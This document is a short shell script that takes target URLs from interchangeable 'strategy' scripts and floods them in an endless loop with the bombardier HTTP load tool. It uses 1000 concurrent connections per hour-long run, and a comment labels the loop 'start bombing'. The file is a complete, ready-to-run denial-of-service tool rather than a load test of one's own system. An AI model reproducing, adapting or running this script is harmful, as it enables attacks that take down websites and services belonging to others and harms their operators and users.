#!/bin/sh

while getopts ":c:t:s:" opt; do
  case $opt in
    c) CONNECTIONS="$OPTARG"
    ;;
    t) TIMEOUT="$OPTARG"
    ;;
    s) STRATEGY="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    exit 1
    ;;
  esac

  case $OPTARG in
    -*) echo "Option $opt needs a valid argument"
    exit 1
    ;;
  esac
done

# if we got strategy argument provided to this command use it, else use random strategy
STRATEGY=${STRATEGY:-$(ls strategies/resources | shuf | head -n1 | rev | cut -c 4- | rev)}

while true; do
  RESOURCE=$(sh "strategies/resources/${STRATEGY}.sh")
  if [ -z "$RESOURCE" ]
  then
    RESOURCE=$(sh "strategies/resources/$(ls strategies/resources | shuf | head -n1 | rev | cut -c 4- | rev).sh")
  fi

  #start bombing
  bombardier -c "${CONNECTIONS:-1000}" -d "${TIMEOUT:-3600}s" -l "$RESOURCE"
done
